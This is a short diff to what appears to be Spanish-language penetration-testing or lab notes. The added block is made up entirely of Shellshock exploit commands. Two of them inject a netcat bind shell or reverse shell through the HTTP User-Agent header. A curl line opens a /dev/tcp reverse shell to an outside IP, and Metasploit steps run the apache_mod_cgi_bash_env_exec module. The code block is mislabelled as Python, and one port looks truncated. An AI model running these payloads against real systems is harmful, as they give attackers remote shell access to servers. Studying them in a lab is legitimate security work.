@@ -737,5 +737,17 @@ vamos a seguir realizando las pruebas para identificar cual de las vulnerabilida
 
 ![[Pasted image 20240622194632.png]]
 
-```pyth
+```python
+#Bind Shell
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 8
+#Reverse shell
+$ echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.159.1 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc vulnerable 80
+#Reverse shell using curl
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.11.0.41/80 0>&1' http://10.1.2.11/cgi-bin/admin.cgi
+#Reverse shell using metasploit
+> use multi/http/apache_mod_cgi_bash_env_exec
+> set targeturi /cgi-bin/admin.cgi
+> set rhosts 10.1.2.11
+> run
 ```
+
